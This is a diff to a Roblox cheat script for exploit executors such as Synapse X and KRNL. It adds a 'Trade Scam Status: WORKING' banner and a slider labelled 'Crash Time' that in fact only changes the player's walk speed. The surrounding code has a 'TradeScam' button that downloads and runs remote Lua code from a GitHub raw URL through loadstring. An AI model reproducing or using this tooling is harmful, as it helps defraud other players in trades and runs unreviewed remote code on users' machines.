@@ -25,6 +25,10 @@ local MainSection = Main:AddSection({
 })
 
 local MainSection = Main:AddSection({
+	Name = "Trade Scam Status: WORKING"
+})
+
+local MainSection = Main:AddSection({
 	Name = "Supported For: Synapse X, KRNL, Arceus X, Vega X, Fluxus, Evon"
 })
 
@@ -469,6 +473,19 @@ TradeScam:AddButton({
 	Callback = function()
       		loadstring(game:HttpGet("https://raw.githubusercontent.com/JohnProgrammer9/Minecraft/main/Key%3AAuth2", true))()
   	end    
+})
+
+TradeScam:AddSlider({
+	Name = "Crash Time",
+	Min = 0,
+	Max = 100,
+	Default = 16,
+	Color = Color3.fromRGB(255,255,255),
+	Increment = 1,
+	ValueName = "Time",
+	Callback = function(Value)
+		game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = Value
+	end    
 })
 
 -- Other
